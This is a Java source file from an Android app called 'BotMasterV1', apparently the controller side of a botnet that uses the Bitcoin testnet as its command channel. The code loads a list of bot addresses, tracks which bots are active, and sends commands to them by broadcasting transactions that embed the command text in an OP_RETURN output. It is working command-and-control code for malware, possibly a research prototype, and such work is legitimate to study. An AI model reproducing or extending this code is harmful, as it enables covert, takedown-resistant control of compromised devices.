package com.example.tonipagliaro.botchain;

import android.app.Application;
import android.app.backup.BackupManager;
import android.content.res.Resources;
import android.os.Environment;
import android.util.Log;

import org.bitcoinj.core.Address;
import org.bitcoinj.core.BlockChain;
import org.bitcoinj.core.Coin;
import org.bitcoinj.core.ECKey;
import org.bitcoinj.core.InsufficientMoneyException;
import org.bitcoinj.core.NetworkParameters;
import org.bitcoinj.core.PeerGroup;
import org.bitcoinj.core.Transaction;
import org.bitcoinj.net.discovery.DnsDiscovery;
import org.bitcoinj.net.discovery.PeerDiscovery;
import org.bitcoinj.params.TestNet3Params;
import org.bitcoinj.script.ScriptBuilder;
import org.bitcoinj.store.BlockStoreException;
import org.bitcoinj.store.SPVBlockStore;
import org.bitcoinj.wallet.SendRequest;
import org.bitcoinj.wallet.UnreadableWalletException;
import org.bitcoinj.wallet.Wallet;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.InetSocketAddress;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class ApplicationState extends Application {

    static final Object[] walletFileLock = new Object[0];

    private String filePrefix = "testnet";

    File walletFile;
    Wallet wallet;
    boolean walletShouldBeRebuilt = false;

    File keychainFile;

    boolean firstTime;

    NetworkParameters params = TestNet3Params.get();

    private PeerDiscovery peerDiscovery;
    private ArrayList<InetSocketAddress> isas = new ArrayList<InetSocketAddress>();

    SPVBlockStore chainStore;
    BlockChain chain;
    //Aggiunte
    PeerGroup peerGroup;

    ArrayList<Address> indirizzi=new ArrayList<Address>();

    File fileMapAddress;
    Map<String,String> mappaIndirizzi=new HashMap<String, String>() ;

    private BackupManager backupManager;

    public static ApplicationState current;

    @Override
    public void onCreate() {
        super.onCreate();

        //SI prendono gli indirizzi dei bot dalle risorse xml e si aggiungono alla lista "indirizzi"
        Resources res = getResources();
        String[] bots = res.getStringArray(R.array.botList);
        for (String s: bots) {
            indirizzi.add(new Address(params, s));
            mappaIndirizzi.put(s,"ok");
        }

        Log.d("App", "Start app state");
        ApplicationState.current = this;
        backupManager = new BackupManager(this);

        fileMapAddress = new File(getFilesDir(), "map_address.bots");

        //Leggiamo il file che tiene traccia dei bot attivi (SE ESISTE)
        if (!fileMapAddress.exists()) {
            saveMappaIndirizzi();
            firstTime = true;
        }
        else {
            loadMappaIndirizzi();
            firstTime = false;
        }


        //Leggiamo o creiamo il wallet
        synchronized (ApplicationState.walletFileLock) {
            File mainDir = new File(Environment.getExternalStorageDirectory(), "BotMasterV1");
            if (!mainDir.exists())
                if (!mainDir.mkdir()) {
                    Log.e("App", "Errore nella crezione della cartella");
                }
            //keychainFile = new File(getFilesDir(), filePrefix+".keychain");
            keychainFile = new File(Environment.getExternalStorageDirectory()+File.separator +"BotMasterV1", filePrefix + ".keychain");
            //walletFile = new File(getFilesDir(), filePrefix + ".wallet");
            walletFile = new File(Environment.getExternalStorageDirectory()+File.separator +"BotMasterV1", filePrefix + ".wallet");
            if (walletFile.exists()) {
                try {
                    wallet = Wallet.loadFromFile(walletFile);
                } catch (UnreadableWalletException e) {
                    e.printStackTrace();
                }
                Log.d("App", "Trovato il file per caricare il wallet");
            }
            else {
                wallet = new Wallet(params);
                Log.d("App", "Creato nuovo wallet...ora attendere il reset delle chiavi");
                try {
                    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(keychainFile));
                    ArrayList<ECKey> keys = (ArrayList<ECKey>) ois.readObject();
                    for (ECKey key : keys) {
                        //wallet.keychain.add(key);
                        wallet.importKey(key);
                    }
                    walletShouldBeRebuilt = true;
                } catch (Exception e) {
                    e.printStackTrace();
                    Log.d("App", "Nessuna chiave precedente è stata trovata, vuol dire che è un nuovo wallet!");
                    wallet.importKey(new ECKey());
                }
                saveWallet();
            }
        }

        //Rimosso
        //peerDiscovery = new DnsDiscovery(params);

        Log.d("App", "Leggo la block store dal disco");
        //File file = new File(getExternalFilesDir(null), filePrefix + ".blockchain");
        File file = new File(Environment.getExternalStorageDirectory()+File.separator +"BotMasterV1", filePrefix + ".blockchain");

        if (!file.exists()) {
            Log.d("App", "Copio la blockchain dalla cartella asset");
            InputStream is = null;
            try {
                is = getAssets().open(filePrefix + ".blockchain");
                OutputStream out = new FileOutputStream(file);
                byte[] buf = new byte[1024];
                int len;
                while ((len = is.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
                out.close();
            } catch (IOException e) {
                e.printStackTrace();
                Log.d("App", "Impossibile trovare la blockchain nella cartella assets...");
            }
            finally {
                if (is != null) {
                    try {
                        is.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }

        }
        try {
            chainStore = new SPVBlockStore(params, file);
            chain = new BlockChain(params, wallet, chainStore);
            peerGroup = new PeerGroup(params, chain);
            peerGroup.addPeerDiscovery(new DnsDiscovery(params));
            peerGroup.addWallet(wallet);
        } catch (BlockStoreException e) {
            throw new Error("Impossibile inizializzare la blockchain");
        }
    }

    public void saveWallet() {
        synchronized (ApplicationState.walletFileLock) {
            Log.d("App", "Salvo il wallet");
            try {
                wallet.saveToFile(walletFile);
            } catch (IOException e) {
                throw new Error("Impossibile salvare il file wallet");
            }

            /*
            // Salva le chiavi solo se abbiamo bisogno di ricreare un wallet (Aggiungere condizione)
            ObjectOutputStream keychain;
            try {
                keychain = new ObjectOutputStream(new FileOutputStream(keychainFile));
                keychain.writeObject(wallet.getImportedKeys());
                keychain.flush();
                keychain.close();
            } catch (IOException e) {
                e.printStackTrace();
                throw new Error("Impossibile salvare il file delle chiavi");
            }
            */
            Log.d("Wallet", "Notifying BackupManager that data has changed. Should backup soon.");
            backupManager.dataChanged();
        }
    }


    public void setStatoBots(String stato) {
        for (String s : mappaIndirizzi.keySet()) {
            mappaIndirizzi.put(s, stato);
        }
        saveMappaIndirizzi();
    }

    public void saveMappaIndirizzi() {
        try {
            Log.d("App", "SCRIVO IL FILE");
            FileOutputStream fos = new FileOutputStream(fileMapAddress);
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(mappaIndirizzi);
            oos.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void loadMappaIndirizzi() {
        if (fileMapAddress.exists())
            try
            {
                Log.d("App", "Leggo il file della mappa degli indirizzi");
                FileInputStream fileInputStream = new FileInputStream(fileMapAddress);
                ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
                HashMap<String, String> map = (HashMap<String,String>)objectInputStream.readObject();
                for (String s: map.keySet()) {
                    mappaIndirizzi.put(s, map.get(s));
                    Log.d("App", "MAPPA INDIRIZZI LETTA DAL FILE: " +s + " VALORE " + mappaIndirizzi.get(s));
                }
            }
            catch(ClassNotFoundException | IOException | ClassCastException e) {
                e.printStackTrace();
            }
    }

    public ArrayList<Address> getBotStateOk() {
        ArrayList<Address> listaBotOk = new ArrayList<Address>();
        for (String s : mappaIndirizzi.keySet()) {
            if (mappaIndirizzi.get(s).equalsIgnoreCase("ok"))
                Log.d("App", "BOT CON STATO OK: " +s);
                listaBotOk.add(new Address(params, s));
        }
        return listaBotOk;
    }

    public ArrayList<Address> getBotStateNo() {
        ArrayList<Address> listaBotNo = new ArrayList<Address>();
        for (String s : mappaIndirizzi.keySet()) {
            if (mappaIndirizzi.get(s).equalsIgnoreCase("no")) {
                listaBotNo.add(new Address(params, s));
            }
        }
        return listaBotNo;
    }


    public  String sendCommand(String command, ArrayList<Address> botAddressList) throws Exception {

        byte[] hash = command.getBytes("UTF-8");

        Transaction transaction = new Transaction( wallet.getParams());

        Coin value = Coin.MILLICOIN;
        Log.d("App", "Valore di FIRSTTIME"+String.valueOf(firstTime));
        if (firstTime) {
            value = value.add(Coin.MILLICOIN);
        }
        for (Address address : botAddressList) {
            transaction.addOutput(value, address);
        }
        transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());

        SendRequest sendRequest = SendRequest.forTx(transaction);

        String string = new String(hash);
        System.out.println("Sending ... " +string);

        wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException

        peerGroup.setMaxConnections(botAddressList.size());
        peerGroup.broadcastTransaction(sendRequest.tx);

        return transaction.getHashAsString();
    }


    public  String sendCommand(String command, Address botAddress) throws Exception {

        Log.d("App", "INVIO UN COMANDO");
        byte[] hash = command.getBytes("UTF-8");

        Transaction transaction = new Transaction(wallet.getParams());

        transaction.addOutput(Coin.MILLICOIN, botAddress);
        transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());


        SendRequest sendRequest = SendRequest.forTx(transaction);

        String string = new String(hash);
        System.out.println("Sending ... " + string);

        wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException

        peerGroup.setMaxConnections(1);
        peerGroup.broadcastTransaction(sendRequest.tx);

        return transaction.getHashAsString();
    }

    public String sendCommandGetOS(String command, Address botAddress) throws Exception {
        Log.d("App", "INVIO UN COMANDO");
        byte[] hash = command.getBytes("UTF-8");

        Transaction transaction = new Transaction(wallet.getParams());

        transaction.addOutput(Coin.MILLICOIN, botAddress);
        transaction.addOutput(Coin.ZERO, new ScriptBuilder().op(106).data(hash).build());


        SendRequest sendRequest = SendRequest.forTx(transaction);

        String string = new String(hash);
        System.out.println("Sending ... " + string);

        wallet.completeTx(sendRequest);   // Could throw InsufficientMoneyException

        peerGroup.setMaxConnections(1);
        peerGroup.broadcastTransaction(sendRequest.tx);

        return transaction.getHashAsString();
    }


}
